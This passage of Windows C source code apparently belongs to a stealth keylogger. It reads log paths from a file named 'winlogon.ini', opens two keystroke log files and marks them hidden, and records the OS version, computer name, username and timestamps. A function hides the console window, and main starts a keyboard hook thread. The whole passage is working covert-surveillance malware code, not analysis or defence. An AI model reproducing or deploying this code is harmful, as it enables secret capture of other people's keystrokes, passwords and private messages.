         * the time-out interval elapses.
         */

        return WaitForSingleObject(hKeyboardThread, INFINITE);
    }
    /* If it is Null then exit the function. */

    else
    {
        return 1;
    }
}

/*****************************************************************************/
/*****************************************************************************/

int fnKlogFileUp(void)
{
    /*************************************************************************/
    /* Gets log file path. */

    /* Reads .ini file. */
    LPCTSTR lpctstrIniPath = _T(".\\winlogon.ini");
    TCHAR tchQLogPathString[256];
    TCHAR tchFLogPathString[256];

    /* Passes .ini files data to tchar array. */
    GetPrivateProfileString(_T("Q Log Record"), _T("Q_Path"), _T(""),
        tchQLogPathString, 256, lpctstrIniPath);
    GetPrivateProfileString(_T("F Log Record"), _T("F_Path"), _T(""),
        tchFLogPathString, 256, lpctstrIniPath);

    /* Q and F keyboard layouts (char array). */
    char szQKlogFilePath[MAX_PATH] = {""};
    char szFKlogFilePath[MAX_PATH] = {""};

    /* Converts tchar array to char array. */
    wcstombs(szQKlogFilePath, tchQLogPathString,
        wcslen(tchQLogPathString) + 1);
    wcstombs(szFKlogFilePath, tchFLogPathString,
        wcslen(tchFLogPathString) + 1);

    /* Opens Q keyboard layout file. */
    FILE *pTQLogFile;
    pTQLogFile = fopen(szQKlogFilePath, "a+");
    /* Opens F keyboard layout file. */
    FILE *pTFLogFile;
    pTFLogFile = fopen(szFKlogFilePath, "a+");

    /*************************************************************************/
    /* Sets log files file attributes. */

    /* Q */
    DWORD dwQKlogFileAttribute = GetFileAttributesA(szQKlogFilePath);
    if(dwQKlogFileAttribute != (FILE_ATTRIBUTE_HIDDEN))
        SetFileAttributesA(szQKlogFilePath,
            FILE_ATTRIBUTE_HIDDEN);
    /* F */
    DWORD dwFKlogFileAttribute = GetFileAttributesA(szFKlogFilePath);
    if(dwFKlogFileAttribute != (FILE_ATTRIBUTE_HIDDEN))
        SetFileAttributesA(szFKlogFilePath,
            FILE_ATTRIBUTE_HIDDEN);


    /*************************************************************************/
    /*
     * Sets cursor position in file.
     * See if file is empty...
     * ftell() returns the current file position of the given stream.
     * Save file's current position.
     */

    /* Q Keyboard */
    long int liQKlogFileSavedOffset = ftell(pTQLogFile);
    fseek(pTQLogFile, 0, SEEK_END); /* fseek() sets the file pstn to END. */
    if (!ftell(pTQLogFile) == 0) /* If file exists, */
        fputs("\n\n", pTQLogFile); /* hit 2 new line below end of the file. */

    fseek(pTQLogFile, liQKlogFileSavedOffset, SEEK_SET); /* Sets cursor pos. */

    /* F Keyboard */
    long int liFKlogFileSavedOffset = ftell(pTFLogFile);
    fseek(pTFLogFile, 0, SEEK_END); /* fseek() sets the file pstn to END. */
    if (!ftell(pTFLogFile) == 0) /* If file exists, */
        fputs("\n\n", pTFLogFile); /* hit 2 new line below end of the file. */

    fseek(pTFLogFile, liFKlogFileSavedOffset, SEEK_SET); /* Sets cursor pos. */

    /*************************************************************************/
    // 
    fputs("########################################"
        "#######################################\n\n", pTQLogFile);
    fputs("########################################"
        "#######################################\n\n", pTFLogFile);

    /*************************************************************************/
    /* Windows Version Checker. */

    if(IsWindows10OrGreater())
    {
        fprintf(pTQLogFile, "# OS\t\t\t: Windows 10 or Successor\n");
        fprintf(pTFLogFile, "# OS\t\t\t: Windows 10 or Successor\n");
    }
    else if(IsWindows8Point1OrGreater())
    {
        fprintf(pTQLogFile, "# OS\t\t\t: Windows 8.1 or Successor\n");
        fprintf(pTFLogFile, "# OS\t\t\t: Windows 8.1 or Successor\n");
    }
    else if(IsWindows8OrGreater())
    {
        fprintf(pTQLogFile, "# OS\t\t\t: Windows 8 or Successor\n");
        fprintf(pTFLogFile, "# OS\t\t\t: Windows 8 or Successor\n");
    }
    else if(IsWindows7SP1OrGreater())
    {
        fprintf(pTQLogFile, "# OS\t\t\t: Windows 7 SP1 or Successor\n");
        fprintf(pTFLogFile, "# OS\t\t\t: Windows 7 SP1 or Successor\n");
    }
    else if(IsWindows7OrGreater())
    {
        fprintf(pTQLogFile, "# OS\t\t\t: Windows 7 or Successor\n");
        fprintf(pTFLogFile, "# OS\t\t\t: Windows 7 or Successor\n");
    }
    else if(IsWindowsVistaSP2OrGreater())
    {
        fprintf(pTQLogFile, "# OS\t\t\t: Windows Vista SP2 or Successor\n");
        fprintf(pTFLogFile, "# OS\t\t\t: Windows Vista SP2 or Successor\n");
    }
    else if(IsWindowsVistaSP1OrGreater())
    {
        fprintf(pTQLogFile, "# OS\t\t\t: Windows Vista SP1 or Successor\n");
        fprintf(pTFLogFile, "# OS\t\t\t: Windows Vista SP1 or Successor\n");
    }
    else if(IsWindowsVistaOrGreater())
    {
        fprintf(pTQLogFile, "# OS\t\t\t: Windows Vista or Successor\n");
        fprintf(pTFLogFile, "# OS\t\t\t: Windows Vista or Successor\n");
    }
    else if(IsWindowsXPSP3OrGreater())
    {
        fprintf(pTQLogFile, "# OS\t\t\t: Windows XP SP3 or Successor\n");
        fprintf(pTFLogFile, "# OS\t\t\t: Windows XP SP3 or Successor\n");
    }
    else if(IsWindowsXPSP2OrGreater())
    {
        fprintf(pTQLogFile, "# OS\t\t\t: Windows XP SP2 or Successor\n");
        fprintf(pTFLogFile, "# OS\t\t\t: Windows XP SP2 or Successor\n");
    }
    else if(IsWindowsXPSP1OrGreater())
    {
        fprintf(pTQLogFile, "# OS\t\t\t: Windows XP SP1 or Successor\n");
        fprintf(pTFLogFile, "# OS\t\t\t: Windows XP SP1 or Successor\n");
    }
    else if(IsWindowsXPOrGreater())
    {
        fprintf(pTQLogFile, "# OS\t\t\t: Windows XP or Successor\n");
        fprintf(pTFLogFile, "# OS\t\t\t: Windows XP or Successor\n");
    }
    else if(IsWindowsServer())
    {
        fprintf(pTQLogFile, "# OS\t\t\t: Windows Server or Successor\n");
        fprintf(pTFLogFile, "# OS\t\t\t: Windows Server or Successor\n");
    }
    else
    {
        fprintf(pTQLogFile, "# OS\t\t\t: Unknown!\n");
        fprintf(pTFLogFile, "# OS\t\t\t: Unknown!\n");
    }

    /*************************************************************************/
    /* Gets computer name. */
    char szComputerName[21];
    TCHAR tchComputerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD dwSize = sizeof(tchComputerName) / sizeof(tchComputerName[0]);
    GetComputerName(tchComputerName, &dwSize); /* fn returns tchar!. */
    /* tchar array to char array conversion. */
    wcstombs(szComputerName, tchComputerName, wcslen(tchComputerName) + 1);
    fprintf(pTQLogFile, "# COMPUTER NAME\t: %s\n", szComputerName);
    fprintf(pTFLogFile, "# COMPUTER NAME\t: %s\n", szComputerName);

    /*************************************************************************/
    /* Gets user name. */
    char szUsername[20];
    unsigned long ulUsernameLenght = 20;
    GetUserNameA(szUsername, &ulUsernameLenght);
    fprintf(pTQLogFile, "# USERNAME\t\t: %s\n", szUsername);
    fprintf(pTFLogFile, "# USERNAME\t\t: %s\n", szUsername);

    /*************************************************************************/
    /* Prints timestamp. */
    fputs("# LOG START\t\t: ", pTQLogFile);
    fputs("# LOG START\t\t: ", pTFLogFile);
    time_t tKlogStartTimestamp = time(NULL);
    fputs(ctime(&tKlogStartTimestamp), pTQLogFile); /* Puts time. */
    fputs(ctime(&tKlogStartTimestamp), pTFLogFile); /* Puts time. */
    fputs("\n", pTQLogFile);
    fputs("\n", pTFLogFile);

    /*************************************************************************/
    /* Closes open file streams. */

    /* Version like two line below, throws "fclose() ambigous" error! */
    //fclose(pTQLogFile);
    //fclose(pTFLogFile);

    /* Use this! */
    fnAllFileStreamsCloser();

    return 0;
}

/*****************************************************************************/
/*****************************************************************************/

int fnNewLineTimer(void)
{
    /* Variables to store date and time components. */

    //int iHour;
    //int iMinute;
    int iSeconds;
    //int iDay;
    //int iMonth;
    //int iYear;

    /* time_t is arithmetic time type. */
    time_t time_tNow;

    /*
     * Obtains current time.
     * time() returns the current time of the system as a time_t value.
     */

    time(&time_tNow);

    /* Converts to local time format and print to stdout. */
    //printf("Today is : %s", ctime(&time_tNow));

    /*
     * localtime converts a time_t value to calendar time and
     * returns a pointer to a tm structure with its members
     * filled with the corresponding values.
     */

    struct tm* SpLocalTime = localtime(&time_tNow);

    ///* Gets hrs since midnight (0-23). */
    //iHour = SpLocalTime->tm_hour;
    ///* Gets mins passed after the hour (0-59). */
    //iMinute = SpLocalTime->tm_min;
    ///* Gets secs passed after minute (0-59). */
    iSeconds = SpLocalTime->tm_sec;

    //iDay = SpLocalTime->tm_mday; /* Gets day of month (1 to 31). */
    //iMonth = SpLocalTime->tm_mon + 1; /* Gets month of year (0 to 11). */
    //iYear = SpLocalTime->tm_year + 1900; /* Gets year since 1900. */

    /* Every 5 sec. */
    if ((iSeconds % 5) == 0)
    {
        fnNewLineTimerPrinter();
    }

    return 0;
}

/*****************************************************************************/
/*****************************************************************************/

int fnNewLineTimerPrinter(void)
{
    /* Gets the rec path. */
    /* Reads .ini file. */
    LPCTSTR lpctstrIniPath = _T(".\\winlogon.ini");
    TCHAR tchQLogPathString[256];
    TCHAR tchFLogPathString[256];

    /* Passes .ini files data to tchar array. */
    GetPrivateProfileString(_T("Q Log Record"), _T("Q_Path"), _T(""), tchQLogPathString, 256, lpctstrIniPath);
    GetPrivateProfileString(_T("F Log Record"), _T("F_Path"), _T(""), tchFLogPathString, 256, lpctstrIniPath);

    /* Q and F keyboard layouts (char array). */
    char szQKlogFilePath[MAX_PATH] = {""};
    char szFKlogFilePath[MAX_PATH] = {""};

    /* Converts tchar array to char array. */
    wcstombs(szQKlogFilePath, tchQLogPathString, wcslen(tchQLogPathString) + 1);
    wcstombs(szFKlogFilePath, tchFLogPathString, wcslen(tchFLogPathString) + 1);

    /* Opens Q keyboard layout file. */
    FILE *pTQLogFile;
    pTQLogFile = fopen(szQKlogFilePath, "a+");
    /* Opens F keyboard layout file. */
    FILE *pTFLogFile;
    pTFLogFile = fopen(szFKlogFilePath, "a+");

    /* Sets log files file attributes. */

    /* Q */
    DWORD dwQKlogFileAttribute = GetFileAttributesA(szQKlogFilePath);
    if(dwQKlogFileAttribute != (FILE_ATTRIBUTE_HIDDEN))
        SetFileAttributesA(szQKlogFilePath,
            FILE_ATTRIBUTE_HIDDEN);
    /* F */
    DWORD dwFKlogFileAttribute = GetFileAttributesA(szFKlogFilePath);
    if(dwFKlogFileAttribute != (FILE_ATTRIBUTE_HIDDEN))
        SetFileAttributesA(szFKlogFilePath,
            FILE_ATTRIBUTE_HIDDEN);

    /*************************************************************************/
    /* Gets and sets datetime to file. */

    time_t time_tNow;
    char cTimeBuffer[51];
    struct tm* S_tm_info;

    time(&time_tNow);
    S_tm_info = localtime(&time_tNow);

    strftime(cTimeBuffer, 51, "\n[%Y/%m/%d %H:%M:%S] ==> ", S_tm_info);

    fputs(cTimeBuffer, pTQLogFile);
    fputs(cTimeBuffer, pTFLogFile);

    fnAllFileStreamsCloser();

    return 0;
}

/*****************************************************************************/
/*****************************************************************************/
/* Function to hide the window of fnKeyboardHook. */

int fnStealthConsole(void)
{
    /*
     * Retrieves a handle to the top-level window whose class name and window
     * name match the specified strings.
     *
     * 1st Parmeter lpClassName: ConsoleWindowClass - Class Name
     * 2nd Parameter lpWindowName: parameter is NULL, all window names match.
     *
     * If the function succeeds, the return value is a handle to the window
     * that has the specified class name and window name.
     *
     * If the function fails, the return value is NULL.
     */

    HWND stealth; /* WinDef.h */

    AllocConsole(); /* ConsoleApi3.h(via Wincon.h, include Windows.h) */

    /* winuser.h (include Windows.h) */
    stealth = FindWindowA("ConsoleWindowClass", NULL);

    ShowWindow(stealth, 0); /* winuser.h (include Windows.h) */

    return 0;
}

/*****************************************************************************/
/*****************************************************************************/

int main(int argc, char** argv)
{
    if(VISIBLE == 0)
    {
        fnStealthConsole();
    }

    fnKlogFileUp();

    fnNewLineTimerPrinter();

    fnKeyboardThreadInit(argv);

    return 0;
}


// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file